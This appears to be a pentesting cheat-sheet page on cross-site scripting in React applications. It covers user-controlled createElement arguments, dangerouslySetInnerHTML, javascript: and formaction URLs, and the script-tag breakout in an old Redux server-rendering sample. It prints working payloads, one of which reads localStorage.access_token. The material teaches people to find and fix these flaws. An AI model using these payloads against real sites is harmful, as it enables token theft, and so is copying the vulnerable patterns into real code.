# Controlling element type

The `createElement` function accepts a string in the `type` argument. If the string is controlled by a user it would be possible to create an arbitrary React component:

```javascript
// Dynamically create an element from a string stored in the backend
// stored_value is a user-controlled string
element_name = stored_value;
React.createElement(element_name, null);
```

However, this would result only in a plain, attribute-less HTML element (pretty useless).

# Injecting props

The `createElement` function accepts a list of attributes in the `props` argument. If the list is controlled by a user it would be possible to inject arbitrary props into the new element:

```javascript
// Parse user-supplied JSON and pass the resulting object as props
// stored_value is a user-controlled JSON string with attributes
props = JSON.parse(stored_value);
React.createElement("span", props);
```

You can use the following payload to set the `dangerouslySetInnerHTML` attribute:

```javascript
{"dangerouslySetInnerHTML" : { "__html": "<img src=x/ onerror=’alert(localStorage.access_token)’>" }}
```

# Explicitly setting dangerouslySetInnerHTML

If a user-supplied data is used to set the `dangerouslySetInnerHTML` attribute you can insert arbitrary JavaScript code:

```javascript
<div dangerouslySetInnerHTML={user_supplied} />
```

# Explicitly setting href

If a user-supplied data is used to set the `href` attribute you can insert a `javascript:` URL:

```javascript
<a href={user_supplied}>Link</a>
```

Some other attributes such as `formaction` in HTML5 buttons or HTML5 imports also can be vulnerable:

```javascript
// HTML5 button
<button form="name" formaction={user_supplied}/>
// HTML5 import
<link rel="import" href={user_supplied}>
```

# Abusing server-side rendering

If a user-controlled data is passed to code that relies on user generated content and input without proper sanitization you can inject arbitrary JavaScript code.

For example, the official [Redux](https://redux.js.org/) code sample for SSR was vulnerable to XSS ([the sample was fixed](https://redux.js.org/usage/server-rendering#inject-initial-component-html-and-state)):

```javascript
function renderFullPage(html, preloadedState) {
  return `
    <!doctype html>
    <html>
      <head>
        <title>Redux Universal Example</title>
      </head>
      <body>
        <div id="root">${html}</div>
        <script>
          window.__PRELOADED_STATE__ = ${JSON.stringify(preloadedState)}
        </script>
        <script src="/static/bundle.js"></script>
      </body>
    </html>
    `
}
```

In the above sample, result of the `JSON.stringify` function is assigned to a global variable in a `<script>` tag, this is the vulnerability. If a Redux store has the following value:

```javascript
{
    user: {
        username: "username",
        bio: "bio</script><script>alert(1)</script>"
    }
}
```

When a browser parses the page and encounters that `<script>` tag, it will continue reading until `</script>`. The browser will not read until the last curly bracket, instead, it will actually finish the script tag after `bio: "as`.

References:
- [The Most Common XSS Vulnerability in React.js Applications](https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0)

# References

- [Exploiting Script Injection Flaws in ReactJS Apps](https://medium.com/dailyjs/exploiting-script-injection-flaws-in-reactjs-883fb1fe36c1)
